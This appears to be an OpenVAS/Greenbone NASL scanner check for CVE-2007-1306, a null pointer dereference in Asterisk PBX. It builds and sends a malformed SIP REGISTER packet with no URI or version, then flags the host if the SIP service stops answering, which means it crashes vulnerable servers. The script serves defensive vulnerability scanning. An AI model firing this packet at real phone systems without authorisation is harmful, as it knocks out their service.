# SPDX-FileCopyrightText: 2008 Ferdy Riphagen
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:digium:asterisk";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.9999991");
  script_version("2023-12-19T05:05:25+0000");
  script_tag(name:"last_modification", value:"2023-12-19 05:05:25 +0000 (Tue, 19 Dec 2023)");
  script_tag(name:"creation_date", value:"2008-08-22 16:09:14 +0200 (Fri, 22 Aug 2008)");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");

  script_cve_id("CVE-2007-1306");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Asterisk PBX NULL Pointer Dereference Overflow");

  script_category(ACT_DENIAL);
  script_family("Denial of Service");
  script_copyright("Copyright (C) 2008 Ferdy Riphagen");
  script_dependencies("gb_digium_asterisk_sip_detect.nasl");
  script_mandatory_keys("digium/asterisk/detected");

  script_tag(name:"summary", value:"Asterisk PBX is prone to a remote buffer overflow vulnerability.");

  script_tag(name:"insight", value:"The application suffers from a null pointer dereference overflow in
  the SIP service.");

  script_tag(name:"impact", value:"When sending a malformed SIP packet with no URI and version in the
  request an attacker can trigger a Denial of Service and shutdown the application resulting in a loss
  of availability.");

  script_tag(name:"solution", value:"Upgrade to Asterisk PBX release 1.4.1 or 1.2.16.");

  script_xref(name:"URL", value:"http://labs.musecurity.com/advisories/MU-200703-01.txt");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/22838");
  script_xref(name:"URL", value:"http://asterisk.org/node/48320");
  script_xref(name:"URL", value:"http://asterisk.org/node/48319");
  script_xref(name:"URL", value:"http://www.kb.cert.org/vuls/id/228032");

  exit(0);
}

# Note:
# Because of many systems using safe_asterisk to watchdog the asterisk running process, this check
# could be false negative or false positive prone.

include("sip.inc");
include("host_details.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! infos = get_app_location_and_proto( cpe:CPE, port:port ) )
  exit( 0 );

proto = infos["proto"];
if( ! sip_alive( port:port, proto:proto ) )
  exit( 0 );

vtstrings = get_vt_strings();
from_default = vtstrings["default"];
from_lower   = vtstrings["lowercase"];

bad_register = string(
    "REGISTER\r\n",
    "Via: SIP/2.0/", toupper( proto ), " ", this_host(), ":", port, "\r\n",
    "To: User <sip:user@", get_host_name(), ":", port, ">\r\n",
    "From: ", from_default, " <sip:", from_lower, "@", this_host(), ":", port, ">\r\n",
    "Call-ID: ", rand(), "\r\n",
    "CSeq: ", rand(), " OPTIONS\r\n",
    "Contact: ", from_default, " <sip:", from_lower, "@", this_host(), ":", port, ">\r\n",
    "Max-Forwards: 0\r\n",
    "Accept: application/sdp\r\n",
    "Content-Length: 0\r\n\r\n");

exp = sip_send_recv( port:port, data:bad_register, proto:proto );
if( isnull( exp ) ) {
  if( ! sip_alive( port:port, proto:proto ) ) {
    security_message( port:port, proto:proto );
    exit( 0 );
  }
}

exit( 99 );
